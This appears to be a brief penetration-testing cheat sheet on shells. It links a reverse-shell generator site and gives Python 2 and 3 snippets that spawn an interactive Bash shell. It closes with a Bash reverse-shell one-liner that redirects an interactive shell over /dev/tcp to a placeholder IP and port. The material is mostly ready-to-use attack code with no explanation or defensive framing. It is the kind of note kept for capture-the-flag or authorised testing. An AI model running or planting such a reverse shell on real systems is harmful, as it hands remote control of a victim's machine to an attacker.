# Resources
- http://www.revshells.com

---

# Python3
```python
import subprocess

def spawn_bash():
    # Spawns an interactive Bash shell
    subprocess.run("/bin/bash")

if __name__ == "__main__":
    spawn_bash()

```

# Python2
```python
import subprocess

def spawn_bash():
    # Spawns an interactive Bash shell
    subprocess.call("/bin/bash")

if __name__ == "__main__":
    spawn_bash()

```

# BASH
```bash
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<port> 0>&1
```
